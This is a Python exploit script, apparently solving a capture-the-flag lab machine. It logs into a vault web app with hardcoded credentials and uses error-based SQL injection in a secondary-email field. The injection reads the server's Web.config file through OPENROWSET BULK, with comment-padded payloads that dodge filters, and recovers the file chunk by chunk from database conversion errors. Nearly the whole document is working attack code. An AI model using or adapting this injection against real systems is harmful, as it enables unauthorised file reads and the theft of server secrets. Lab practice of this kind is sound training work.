#!/usr/bin/env python3
import requests
import re
import html
import urllib3

urllib3.disable_warnings()

TARGET = "https://vault.royalflush.htb"
EMAIL = "jdover66@royalflush.htb"
PASSWORD = "42zyTJ94BwdKjEw1XNmt"

# Login
s = requests.Session()
s.verify = False
print("Attempting to login")
s.post(f"{TARGET}/Auth/Login", data={'email': EMAIL, 'password': PASSWORD})
print("Success")

# Read Web.config via SQLi
print("Reading Web.config via SQL injection")
content = ""
chunk_size = 500

for offset in range(0, 10000, chunk_size):
    payload = f"test'/**/AND/**/1=CAST((SELECT/**/SUBSTRING(BulkColumn,{offset},{chunk_size})/**/FROM/**/OPENROWSET(BULK/**/'C:\\inetpub\\wwwroot\\vault.royalflush.htb\\Web.config',/**/SINGLE_CLOB)/**/AS/**/x)/**/AS/**/INT)--@a.com"
    
    r = s.post(f"{TARGET}/My/SecondaryEmail", data={'secondaryEmail': payload})
    
    match = re.search(r"converting the (?:nvarchar|varchar) value '([^']+)'", r.text, re.IGNORECASE)
    if match:
        chunk = html.unescape(match.group(1).replace('<br>', '\n'))
        if len(chunk) > 5:
            content += chunk
        else:
            break
    else:
        break
print("*****************************************************************************************")
print(content)